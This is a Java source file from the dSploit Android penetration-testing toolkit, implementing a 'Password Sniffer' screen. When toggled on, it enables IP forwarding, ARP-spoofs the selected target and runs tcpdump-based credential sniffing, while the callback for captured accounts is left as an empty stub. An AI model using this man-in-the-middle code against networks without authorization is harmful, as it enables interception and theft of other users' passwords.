/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.system.Environment;
import it.evilsocket.dsploit.system.Shell.OutputReceiver;
import it.evilsocket.dsploit.tools.ArpSpoof;
import it.evilsocket.dsploit.tools.TcpDump;
import it.evilsocket.dsploit.tools.TcpDump.PasswordReceiver;
import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.ToggleButton;

public class PasswordSniffer extends Activity 
{
	private static final String  PCAP_FILTER = "not '(src host localhost or dst host localhost or arp)'";

	private ToggleButton mSniffToggleButton = null;
	private ProgressBar	 mSniffProgress     = null;
	private TextView	 mSniffText			= null;		
	private boolean	     mRunning			= false;	
	private ArpSpoof     mArpSpoof			= null;
	private TcpDump	     mTcpDump			= null;
	
	public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);        
        setTitle( "MITM - Password Sniffer" );
        setContentView( R.layout.plugin_mitm_sniffer );
        
        mSniffToggleButton = ( ToggleButton )findViewById( R.id.sniffToggleButton );
        mSniffProgress	   = ( ProgressBar )findViewById( R.id.sniffActivity );
        mSniffText		   = ( TextView )findViewById( R.id.sniffData );
        
        mSniffText.setEnabled(false);
        
        mArpSpoof = new ArpSpoof( this );
        mTcpDump  = new TcpDump( this );
                
        mSniffToggleButton.setOnClickListener( new OnClickListener(){
			@Override
			public void onClick(View v) {
				if( mRunning )
				{
					setStoppedState();
				}
				else
				{
					setStartedState();
				}
			}} 
		);        
	}

	private void setStoppedState( ) {		
		mArpSpoof.kill();
		mTcpDump.kill();

		mSniffProgress.setVisibility( View.INVISIBLE );
		
		mRunning = false;
		mSniffToggleButton.setChecked( false );                			
	}

	private void setStartedState( ) {		
		// never say never :)
		mArpSpoof.kill();
		mTcpDump.kill();
		
		final ArpSpoof spoof = mArpSpoof;
		final TcpDump  dump  = mTcpDump;
		
		Environment.setForwarding( true );
		
		OutputReceiver receiver = new OutputReceiver(){
			@Override
			public void onStart(String command) {
				Log.d( "ARPSPOOF", "ArpSpoof started." );
			}

			@Override
			public void onNewLine( String line ) {
				// arpspoof sometimes goes segfault, restart it just in case :P
				if( line.trim().toLowerCase().contains("segmentation fault") )
				{
					Log.w( "ARPSPOOF", "Restarting arpspoof after SEGFAULT" );
					spoof.kill();
					spoof.spoof( Environment.getTarget(), this );
				}
			}

			@Override
			public void onEnd(int exitCode) { }
		};
			
		spoof.spoof( Environment.getTarget(), receiver ).start();
		
		dump.sniffPasswords( PCAP_FILTER, new PasswordReceiver(){
			@Override
			public void onAccountFound(String port, String protocol) {
				// TODO Auto-generated method stub
				
			}
			
		}).start();
		
		mSniffProgress.setVisibility( View.VISIBLE );
		mRunning = true;
	}
	
	@Override
	public void onBackPressed() {
	    setStoppedState();	
	    super.onBackPressed();
	    overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);	    	    
	}
}